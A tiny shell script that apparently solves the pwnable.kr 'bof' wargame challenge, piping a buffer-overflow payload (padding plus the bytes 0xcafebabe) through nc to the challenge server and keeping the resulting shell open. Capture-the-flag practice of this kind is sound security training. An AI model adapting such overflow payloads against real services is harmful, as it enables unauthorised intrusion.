#!/usr/bin/env sh

(python2 -c 'print 13 * "AAAA" + "\xbe\xba\xfe\xca"' && cat) | nc pwnable.kr 9000
